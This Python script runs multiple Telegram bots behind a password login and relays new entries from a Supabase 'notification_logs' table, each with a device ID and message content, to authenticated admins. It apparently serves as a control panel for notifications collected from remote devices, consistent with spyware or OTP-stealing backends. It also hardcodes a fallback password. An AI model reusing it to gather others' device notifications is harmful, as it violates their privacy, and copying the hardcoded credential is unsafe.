import telebot
import time
import threading
import logging
import os
from multiprocessing import Process
from supabase import create_client, Client
from bot_commands_menu import setup_bot_menu

TELEGRAM_TOKENS = [t.strip() for t in os.environ.get("BOT_TOKENS", "").split(",") if t.strip()]
ACCESS_PASSWORD = os.environ.get("MASTER_PASSWORD", "Zaen123@123@")
SUPABASE_URL = os.environ.get("SUPABASE_URL_A")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY_A")

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

if not TELEGRAM_TOKENS or not SUPABASE_URL:
    logger.error("Missing environment variables")
    exit(1)

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
authenticated_admins = set()

def run_bot(token):
    try:
        bot = telebot.TeleBot(token)
        logger.info(f"Starting bot with token: {token[:10]}...")

        @bot.message_handler(commands=['login'])
        def login(message):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Usage: /login [password]")
                return
            if parts[1] == ACCESS_PASSWORD:
                authenticated_admins.add(message.from_user.id)
                bot.reply_to(message, "✅ Authenticated. Use /menu.")
            else:
                bot.reply_to(message, "💀 Invalid password.")

        @bot.message_handler(func=lambda message: True)
        def handle_all(message):
            if message.from_user.id not in authenticated_admins:
                if not message.text.startswith('/login'):
                    bot.send_message(message.chat.id, "🔐 Please /login first.")
                return
            if message.text.startswith('/menu') or message.text.startswith('/start'):
                setup_bot_menu(bot, message.from_user.id, supabase)

        bot.polling(none_stop=True)
    except Exception as e:
        logger.error(f"Error in bot {token[:10]}: {e}")

def monitor_notifications():
    last_id = 0
    try:
        res = supabase.table("notification_logs").select("id").order("id", desc=True).limit(1).execute()
        if res.data:
            last_id = res.data[0]['id']
    except:
        pass
    while True:
        try:
            if authenticated_admins:
                new_logs = supabase.table("notification_logs").select("*").gt("id", last_id).order("id").execute()
                for log in new_logs.data:
                    msg = f"📩 **New Notification**\n📱 ID: `{log['device_id']}`\n📝 Content: {log.get('content', '')}"
                    for admin in authenticated_admins:
                        main_bot = telebot.TeleBot(TELEGRAM_TOKENS[0])
                        main_bot.send_message(admin, msg, parse_mode='Markdown')
                    last_id = log['id']
            time.sleep(10)
        except Exception:
            time.sleep(30)

if __name__ == "__main__":
    logger.info(f"Initializing {len(TELEGRAM_TOKENS)} bots...")
    threading.Thread(target=monitor_notifications, daemon=True).start()
    processes = []
    for t in TELEGRAM_TOKENS:
        p = Process(target=run_bot, args=(t,))
        p.start()
        processes.append(p)
    for p in processes:
        p.join()